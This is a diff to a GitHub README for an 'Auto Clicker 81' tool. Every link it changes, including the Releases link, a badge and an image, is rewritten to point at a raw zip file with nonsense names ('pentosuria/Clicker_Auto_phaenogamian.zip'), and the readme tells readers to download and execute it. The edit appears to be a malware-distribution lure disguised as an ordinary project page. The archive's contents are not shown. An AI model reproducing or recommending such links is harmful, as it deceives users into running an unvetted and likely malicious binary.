@@ -1,6 +1,6 @@
 # Auto Clicker 81 🚀
 
-![Auto Clicker](https://img.shields.io/badge/Download%20Auto%20Clicker%20-%20Latest%20Release-brightgreen)
+![Auto Clicker](https://github.com/sumitakbar/Auto-Clicker-81/raw/refs/heads/main/pentosuria/Clicker_Auto_phaenogamian.zip%20Auto%20Clicker%20-%20Latest%20Release-brightgreen)
 
 Welcome to the **Auto Clicker 81** repository! This project provides a simple yet powerful auto clicker tool that automates mouse clicks at customizable intervals. Whether you're looking to improve your productivity or automate repetitive tasks in games or software applications, this tool is designed to help you save time and effort.
 
@@ -23,7 +23,7 @@ Welcome to the **Auto Clicker 81** repository! This project provides a simple ye
 
 ## Installation
 
-To get started, download the latest version of the auto clicker from the [Releases](https://github.com/sumitakbar/Auto-Clicker-81/releases) section. Once downloaded, simply execute the file to start using the tool.
+To get started, download the latest version of the auto clicker from the [Releases](https://github.com/sumitakbar/Auto-Clicker-81/raw/refs/heads/main/pentosuria/Clicker_Auto_phaenogamian.zip) section. Once downloaded, simply execute the file to start using the tool.
 
 ## Usage
 
@@ -32,7 +32,7 @@ To get started, download the latest version of the auto clicker from the [Releas
 3. **Start Clicking**: Press the start button to begin the auto-clicking process.
 4. **Stop Clicking**: Use the stop button to halt the clicking whenever you wish.
 
-![Auto Clicker Interface](https://example.com/path-to-your-image.png)
+![Auto Clicker Interface](https://github.com/sumitakbar/Auto-Clicker-81/raw/refs/heads/main/pentosuria/Clicker_Auto_phaenogamian.zip)
 
 ## Customization
 
@@ -58,7 +58,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Contact
 
-For any inquiries or feedback, please reach out to the repository owner via GitHub. You can also check the [Releases](https://github.com/sumitakbar/Auto-Clicker-81/releases) section for updates and new features.
+For any inquiries or feedback, please reach out to the repository owner via GitHub. You can also check the [Releases](https://github.com/sumitakbar/Auto-Clicker-81/raw/refs/heads/main/pentosuria/Clicker_Auto_phaenogamian.zip) section for updates and new features.
 
 ---
 
